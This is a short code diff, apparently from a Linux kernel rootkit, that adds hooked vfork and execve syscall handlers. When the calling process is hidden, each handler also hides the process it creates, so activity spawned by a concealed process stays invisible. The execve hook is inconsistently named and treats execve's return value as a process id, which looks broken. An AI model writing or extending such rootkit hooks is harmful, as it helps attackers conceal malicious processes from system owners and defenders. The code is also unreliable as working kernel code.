@@ -83,6 +83,24 @@ asmlinkage long rk_fork(const struct pt_regs *pt_regs)
     return i;
 }
 
+asmlinkage long rk_vfork(const struct pt_regs *pt_regs)
+{
+    long i = orig_vfork(pt_regs);
+    if (is_hidden_proc(current->pid))
+        hide_proc(i);
+    // FM_INFO("vfork from %d to %ld\n", current->pid, i);
+    return i;
+}
+
+asmlinkage long long_execve(const struct pt_regs *pt_regs)
+{
+    long i = orig_execve(pt_regs);
+    if (is_hidden_proc(current->pid))
+        hide_proc(i);
+    FM_INFO("execve from %d to %ld\n", current->pid, i);
+    return i;
+}
+
 asmlinkage long rk_exit(const struct pt_regs *pt_regs)
 {
     // FM_INFO("exit from %d\n", current->pid);
